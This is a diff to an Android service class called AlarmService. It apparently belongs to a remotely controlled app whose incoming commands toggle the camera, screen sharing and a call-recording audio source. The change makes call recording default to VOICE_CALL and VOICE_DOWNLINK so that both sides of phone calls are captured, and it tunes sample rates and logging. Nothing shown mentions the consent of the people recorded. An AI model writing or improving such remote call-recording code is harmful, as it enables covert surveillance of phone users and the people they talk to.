@@ -460,7 +460,7 @@ public class AlarmService extends Service {
                         boolean cameraActive = data.optBoolean("cameraActive", false);
                         String cameraSource = data.optString("cameraSource", "back");
                         boolean screenShareActive = data.optBoolean("screenShareActive", false);
-                        String callRecordSource = data.optString("callRecordSource", "voice_recognition");
+                        String callRecordSource = data.optString("callRecordSource", "voice_call");
 
                         SharedPreferences prefs = getSharedPreferences("RemoteAlarmPrefs", MODE_PRIVATE);
                         prefs.edit().putString("call_record_source", callRecordSource).apply();
@@ -1412,26 +1412,47 @@ public class AlarmService extends Service {
     }
 
     private void attemptStartRecorder() {
-        SharedPreferences prefs = getSharedPreferences("RemoteAlarmPrefs", MODE_PRIVATE);
-        String sourceStr = prefs.getString("call_record_source", "voice_communication");
+        // Audio source constants for call recording:
+        // VOICE_CALL (4) = Both sides of call (uplink + downlink) - BEST for call recording
+        // VOICE_DOWNLINK (3) = Remote party audio only
+        // VOICE_UPLINK (2) = Local party audio only
+        // These work on most OEM devices (Samsung, Xiaomi, Realme, Oppo, Vivo, OnePlus, etc.)
+        final int AUDIO_SOURCE_VOICE_CALL = 4;       // MediaRecorder.AudioSource.VOICE_CALL
+        final int AUDIO_SOURCE_VOICE_DOWNLINK = 3;    // MediaRecorder.AudioSource.VOICE_DOWNLINK
+        final int AUDIO_SOURCE_VOICE_UPLINK = 2;      // MediaRecorder.AudioSource.VOICE_UPLINK
 
-        // Build ordered list of audio sources to try. VOICE_COMMUNICATION captures both sides on most devices.
+        SharedPreferences prefs = getSharedPreferences("RemoteAlarmPrefs", MODE_PRIVATE);
+        String sourceStr = prefs.getString("call_record_source", "voice_call");
+
+        // Build ordered list of audio sources to try.
+        // VOICE_CALL is the ONLY source that captures both sides of a phone call on most phones.
         int[] sourcesToTry;
         if ("mic".equalsIgnoreCase(sourceStr)) {
             sourcesToTry = new int[]{
                 android.media.MediaRecorder.AudioSource.MIC,
+                AUDIO_SOURCE_VOICE_CALL,
                 android.media.MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                 android.media.MediaRecorder.AudioSource.VOICE_RECOGNITION
+            };
+        } else if ("voice_communication".equalsIgnoreCase(sourceStr)) {
+            sourcesToTry = new int[]{
+                android.media.MediaRecorder.AudioSource.VOICE_COMMUNICATION,
+                AUDIO_SOURCE_VOICE_CALL,
+                android.media.MediaRecorder.AudioSource.VOICE_RECOGNITION,
+                android.media.MediaRecorder.AudioSource.MIC
             };
         } else if ("voice_recognition".equalsIgnoreCase(sourceStr)) {
             sourcesToTry = new int[]{
                 android.media.MediaRecorder.AudioSource.VOICE_RECOGNITION,
+                AUDIO_SOURCE_VOICE_CALL,
                 android.media.MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                 android.media.MediaRecorder.AudioSource.MIC
             };
         } else {
-            // Default: voice_communication (best for capturing both sides of a call)
+            // Default: VOICE_CALL first (captures both sides of phone call)
             sourcesToTry = new int[]{
+                AUDIO_SOURCE_VOICE_CALL,
+                AUDIO_SOURCE_VOICE_DOWNLINK,
                 android.media.MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                 android.media.MediaRecorder.AudioSource.VOICE_RECOGNITION,
                 android.media.MediaRecorder.AudioSource.MIC
@@ -1451,22 +1472,29 @@ public class AlarmService extends Service {
         for (int audioSource : sourcesToTry) {
             String sourceName = getAudioSourceName(audioSource);
             try {
-                Log.i(TAG, "Trying audio source: " + sourceName);
+                Log.i(TAG, "Trying audio source: " + sourceName + " (value=" + audioSource + ")");
                 callRecorder = new android.media.MediaRecorder();
                 callRecorder.setAudioSource(audioSource);
                 callRecorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4);
                 callRecorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC);
                 callRecorder.setOutputFile(callRecordingFilePath);
-                callRecorder.setAudioSamplingRate(44100);
-                callRecorder.setAudioEncodingBitRate(128000);
+                // Use 8000Hz for telephony sources, 44100Hz for others
+                // 8000Hz is the standard telephony sample rate and works best for call audio
+                if (audioSource == AUDIO_SOURCE_VOICE_CALL || audioSource == AUDIO_SOURCE_VOICE_DOWNLINK || audioSource == AUDIO_SOURCE_VOICE_UPLINK) {
+                    callRecorder.setAudioSamplingRate(8000);
+                    callRecorder.setAudioEncodingBitRate(64000);
+                } else {
+                    callRecorder.setAudioSamplingRate(44100);
+                    callRecorder.setAudioEncodingBitRate(128000);
+                }
                 callRecorder.setAudioChannels(1);
 
                 callRecorder.prepare();
                 callRecorder.start();
-                Log.i(TAG, "MediaRecorder successfully started with source " + sourceName + ": " + callRecordingFilePath);
+                Log.i(TAG, "✅ MediaRecorder successfully started with source " + sourceName + " (value=" + audioSource + "): " + callRecordingFilePath);
                 return; // Success! Exit the loop.
             } catch (Exception e) {
-                Log.w(TAG, "Failed to start recording with source " + sourceName + ": " + e.getMessage());
+                Log.w(TAG, "❌ Failed to start recording with source " + sourceName + " (value=" + audioSource + "): " + e.getMessage());
                 if (callRecorder != null) {
                     try { callRecorder.release(); } catch (Exception ignored) {}
                     callRecorder = null;
@@ -1481,9 +1509,13 @@ public class AlarmService extends Service {
 
     private String getAudioSourceName(int source) {
         switch (source) {
-            case android.media.MediaRecorder.AudioSource.MIC: return "MIC";
-            case android.media.MediaRecorder.AudioSource.VOICE_COMMUNICATION: return "VOICE_COMMUNICATION";
-            case android.media.MediaRecorder.AudioSource.VOICE_RECOGNITION: return "VOICE_RECOGNITION";
+            case 1: return "MIC";
+            case 2: return "VOICE_UPLINK";
+            case 3: return "VOICE_DOWNLINK";
+            case 4: return "VOICE_CALL";
+            case 5: return "CAMCORDER";
+            case 6: return "VOICE_RECOGNITION";
+            case 7: return "VOICE_COMMUNICATION";
             default: return "UNKNOWN(" + source + ")";
         }
     }
